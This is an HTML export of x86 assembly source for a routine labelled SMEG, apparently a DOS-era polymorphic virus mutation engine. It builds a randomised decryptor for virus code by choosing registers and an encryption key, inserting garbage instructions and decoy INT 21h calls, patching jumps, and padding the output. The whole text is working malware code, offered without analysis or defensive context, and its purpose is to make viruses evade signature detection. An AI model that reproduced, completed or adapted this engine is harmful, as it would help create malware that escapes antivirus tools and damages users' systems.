<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
</span><span class="sc5">SMEG</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">dataarea_for_SMEG</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">datasize</span><span class="sc4">-</span><span class="sc5">dataarea_for_SMEG</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">    </span><span class="sc1">; save length to crypt</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">sourceptr</span><span class="sc4">-</span><span class="sc5">dataarea_for_SMEG</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">   </span><span class="sc1">; save offset to data to crypt</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">targetptr</span><span class="sc4">-</span><span class="sc5">dataarea_for_SMEG</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">   </span><span class="sc1">; save offset to where to put crypted stuff</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc4">-</span><span class="sc2">6h</span><span class="sc0">              </span><span class="sc1">; clear the work area with 0's</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc5">clear_dataarea</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">ch</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">     </span><span class="sc5">clear_dataarea</span><span class="sc0">
        </span><span class="sc1">;--------------</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">initialIP</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; store initial IP</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">use_regs_tbl</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">23d</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">random_ax</span><span class="sc0">
        </span><span class="sc6">xlat</span><span class="sc0">     </span><span class="sc1">;AL=[BX+AL]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4h</span><span class="sc0">
</span><span class="sc5">fill_registers</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">                   </span><span class="sc1">; fill in which registers</span><span class="sc0">
        </span><span class="sc6">rcl</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; do which job</span><span class="sc0">
        </span><span class="sc6">rcl</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">rcl</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">rcl</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">     </span><span class="sc5">fill_registers</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">5</span><span class="sc0">         </span><span class="sc1">; use BP as a garbling register</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">1h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">random_dx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">6h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">                 </span><span class="sc1">; register</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; flip to the other one</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc2">3</span><span class="sc0">       </span><span class="sc1">; is it BX?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">      </span><span class="sc5">is_not_bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">is_not_bx</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc5">gen_cryptval</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">random_any_dx</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">       </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">gen_cryptval</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">cryptval</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">        </span><span class="sc1">; store encryption value</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">random_any_dx</span><span class="sc0">           </span><span class="sc1">; get a random value for the</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc0">                      </span><span class="sc1">; offset of memory references,</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ptr_offsets</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">     </span><span class="sc1">; i.e. the XXXX in [bp+XXXX]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">3h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">random_dx</span><span class="sc0">               </span><span class="sc1">; do the following from</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">3h</span><span class="sc0">                   </span><span class="sc1">; 3..7 times</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">begin_garble</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">garble_more</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">random_ax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8Ch</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">      </span><span class="sc5">no_int21</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">number_of_fnc21</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">random_ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">int21fcns</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0B4h</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">    </span><span class="sc1">;AX -&gt; DS:SI</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">21CDh</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">    </span><span class="sc1">;AX -&gt; DS:SI</span><span class="sc0">
</span><span class="sc5">no_int21</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">     </span><span class="sc5">begin_garble</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">                      </span><span class="sc1">; write garbage for offset</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">                            </span><span class="sc1">; of call for now</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">garble_more</span><span class="sc0">             </span><span class="sc1">; encode some garbage</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">                 </span><span class="sc1">; encode a JMP</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">                 </span><span class="sc1">; patch CALL to point to</span><span class="sc0">
                                         </span><span class="sc1">; space past the JMP where we</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">garble_more</span><span class="sc0">             </span><span class="sc1">; encode a garbage subroutine</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C3h</span><span class="sc0">                 </span><span class="sc1">; encode a RETN</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">                 </span><span class="sc1">; Make JMP go past subroutine</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">encode_routine</span><span class="sc0">          </span><span class="sc1">; encode the routine!</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">dataarea_for_SMEG</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">)</span><span class="sc0">
                                         </span><span class="sc1">; default to using data temp</span><span class="sc0">
                                         </span><span class="sc1">; storage register to return</span><span class="sc0">
                                         </span><span class="sc1">; to top of loop</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">; check return code of routine</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">how_to_top</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc0">                      </span><span class="sc1">; if 0, instead use encryption</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc0">                      </span><span class="sc1">; value register to return</span><span class="sc0">
</span><span class="sc5">how_to_top</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">75h</span><span class="sc0">                  </span><span class="sc1">; encode JNZ</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">garble_some</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">                </span><span class="sc1">; encode a JMP</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc0">                      </span><span class="sc1">; skip the offset for now</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">               </span><span class="sc1">; patch the JNZ</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">garble_some</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">random_any_ax</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                    </span><span class="sc1">; first entry requires</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; no register setup, so</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">no_setup</span><span class="sc0">                </span><span class="sc1">; jmp past it</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B8h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">       </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; MOV word-reg, XXXX</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">loop_top</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">targetptr</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">initialIP</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">garble_some</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">no_setup</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">jmp_table</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                      </span><span class="sc1">; encode method of returning</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">    </span><span class="sc1">;AX-&gt;DS:[DI]            ; to the top of the loop</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">garble_more</span><span class="sc0">
</span><span class="sc5">pad_paragraph</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                   </span><span class="sc1">; pad the decryptor out to the</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">targetptr</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; nearest paragraph</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">                  </span><span class="sc1">; do we need to?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">padded</span><span class="sc0">                  </span><span class="sc1">; no, we are done</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Ch</span><span class="sc0">                  </span><span class="sc1">; otherwise, still a lot to go?</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">       </span><span class="sc5">one_byte_pad</span><span class="sc0">            </span><span class="sc1">; no, do one byte at a time</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">not_branch_garble</span><span class="sc0">       </span><span class="sc1">; else do a nonbranching</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">pad_paragraph</span><span class="sc0">     </span><span class="sc1">; instruction</span><span class="sc0">
</span><span class="sc5">one_byte_pad</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">random_any_ax</span><span class="sc0">           </span><span class="sc1">; do a random one byte padding</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">do_one_byte</span><span class="sc0">             </span><span class="sc1">; instruction</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">pad_paragraph</span><span class="sc0">
</span><span class="sc5">padded</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">dataarea_for_SMEG</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">targetptr</span><span class="sc4">-</span><span class="sc5">dataarea_for_SMEG</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">decryptor_size</span><span class="sc4">-</span><span class="sc5">dataarea_for_SMEG</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">initialIP</span><span class="sc4">-</span><span class="sc5">dataarea_for_SMEG</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">pointer_fixup</span><span class="sc4">-</span><span class="sc5">dataarea_for_SMEG</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">pointer_patch</span><span class="sc4">-</span><span class="sc5">dataarea_for_SMEG</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">crypt_type</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; get encryption type so</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                    </span><span class="sc1">; the initial value of the</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">      </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                   </span><span class="sc1">; counter can be calculated</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">counter_init_table</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">datasize</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">counter_patch</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; patch the value of the</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">                 </span><span class="sc1">; counter as needed</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
